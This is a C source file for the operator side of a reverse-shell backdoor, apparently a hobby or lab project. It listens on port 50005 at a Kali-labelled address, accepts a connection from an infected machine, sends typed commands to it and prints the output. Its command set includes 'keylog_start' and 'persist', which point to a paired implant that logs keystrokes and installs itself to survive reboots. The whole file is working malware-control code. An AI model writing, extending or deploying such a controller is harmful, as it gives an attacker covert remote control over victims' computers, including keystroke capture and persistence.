#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(){

	int sock, client_socket;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in server_addr, client_addr;
	int i=0;
	int optval=1;
	socklen_t client_length;

	printf("%s", "Got to start");
	sock = socket(AF_INET, SOCK_STREAM, 0);
	printf("%s", "Got to A");
	if  (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) <0) {
		printf("Error setting TCP Socket OPtions!\n");
		return 1;
	}
	printf("%s", "Got to B");
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr("10.0.2.15"); // EN Kali linus machine
	server_addr.sin_port = htons(50005);
	printf("%s", "Got to C");
	bind(sock, (struct sockaddr *) &server_addr, sizeof(server_addr));
	listen(sock, 5);
	printf("%s", "listening on port 50005");
	client_length = sizeof(client_addr);
	client_socket = accept(sock, (struct sockaddr *) &client_addr, &client_length);
	

	while(1){
	
		jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("* Shell#%s~$: ", inet_ntoa(client_addr.sin_addr));
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n");
		write(client_socket, buffer, sizeof(buffer));

		if (strncmp("q", buffer, 1) ==0){
			break;
		}
		else if (strncmp("cd ", buffer, 3)==0) {
			goto jump;
		}
		else if (strncmp("keylog_start", buffer, 12)==0){
			goto jump;
		}
		else if (strncmp("persist", buffer, 7)==0){
			recv(client_socket, response, sizeof(response), 0);
			printf("%s", response);
		}
		else{
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}

			

	
	
	
	}




}
